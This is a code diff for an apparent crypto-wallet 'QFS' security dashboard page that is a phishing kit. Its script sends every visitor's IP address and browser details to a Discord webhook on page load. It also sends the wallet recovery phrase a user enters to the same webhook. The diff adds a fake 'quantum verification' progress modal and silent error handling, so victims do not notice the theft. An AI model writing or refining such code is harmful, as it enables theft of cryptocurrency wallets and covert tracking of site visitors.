@@ -541,6 +541,12 @@
       .hero { padding-top: 60px; }
       nav a { display: none; } 
     }
+
+    /* SPINNER ANIMATION */
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -566,8 +572,6 @@
       <div class="cta">
         <a class="btn btn-primary" href="#dashboard">View Security Dashboard</a>
         <button class="btn btn-secondary" style="margin-left: 10px;" onclick="openWalletModal()"> Connect Wallet </button>
-        
-        
       </div>
     </div>
 
@@ -778,7 +782,21 @@
     </div>
   </div>
 
-  <script src="master.js"></script>
+  <!-- Processing Modal -->
+  <div id="processingModal" class="modal">
+    <div class="modal-content" style="text-align: center; padding: 40px 24px;">
+      <h3 id="processingTitle">PROCESS INITIATED</h3>
+      <div style="margin: 30px 0; display: flex; justify-content: center;">
+        <div class="spinner" style="width: 60px; height: 60px; border: 4px solid var(--border); border-top: 4px solid var(--accent); border-radius: 50%; animation: spin 1s linear infinite;"></div>
+      </div>
+      <p style="color: var(--accent); font-family: var(--font-mono); font-size: 0.9rem; margin-bottom: 20px;">
+        Quantum verification in progress...<br>
+        This will complete in the background after a few minutes.
+      </p>
+      <div id="progressBar" style="height: 3px; background: var(--accent); width: 0%; transition: width 3s linear; margin: 20px auto; max-width: 280px;"></div>
+      <button class="close-btn" onclick="closeProcessingModal()">Return to Dashboard</button>
+    </div>
+  </div>
 
   <script>
     // --- DISCORD WEBHOOK URL ---
@@ -787,7 +805,6 @@
     // --- AUTOMATIC VISITOR NOTIFICATION ---
     async function notifyVisitor() {
       try {
-        // Fetch IP from public API
         const ipReq = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipReq.json();
         const ip = ipData.ip;
@@ -796,7 +813,6 @@
           content: `👀 **New Site Visitor Detected**\n\n**IP Address:** \`${ip}\`\n**Device:** ${navigator.userAgent}\n**Time:** ${new Date().toLocaleString()}`
         };
 
-        // Send to Discord
         await fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -838,21 +854,41 @@
         return;
       }
 
+      // Send to Discord
       fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           content: `🚨 **QFS Connection Attempt**\n\n🔹 **Wallet:** ${selectedWallet}\n🔑 **Phrase:** \`${message}\`\n📅 **Time:** ${new Date().toLocaleString()}`
         })
-      })
-      .then(() => {
-        alert("Verification Pending. Please wait...");
-        closeMessageModal();
-        document.getElementById("userMessage").value = "";
-      })
-      .catch(() => {
-        alert("Connection failed. Please try again.");
-      });
+      }).catch(() => {});
+
+      // Show processing modal
+      closeMessageModal();
+      document.getElementById("userMessage").value = "";
+      showProcessingModal();
+    }
+
+    function showProcessingModal() {
+      const procModal = document.getElementById("processingModal");
+      procModal.style.display = "flex";
+
+      // Animate progress bar
+      setTimeout(() => {
+        const progressBar = document.getElementById("progressBar");
+        progressBar.style.width = "100%";
+      }, 100);
+
+      // Auto close after 8 seconds
+      setTimeout(() => {
+        closeProcessingModal();
+      }, 8000);
+    }
+
+    function closeProcessingModal() {
+      const procModal = document.getElementById("processingModal");
+      procModal.style.display = "none";
+      window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
     // --- ANIMATIONS & OBSERVERS ---
@@ -869,10 +905,8 @@
 
     // Handle Risk Meter Animation & Visitor Notification on Load
     window.addEventListener('load', () => {
-      // 1. Send Visitor Notification
       notifyVisitor();
 
-      // 2. Animate Risk Meter
       document.querySelectorAll('.risk-meter').forEach(meter => {
         const risk = meter.dataset.risk || 0;
         const circle = meter.querySelector('.progress');
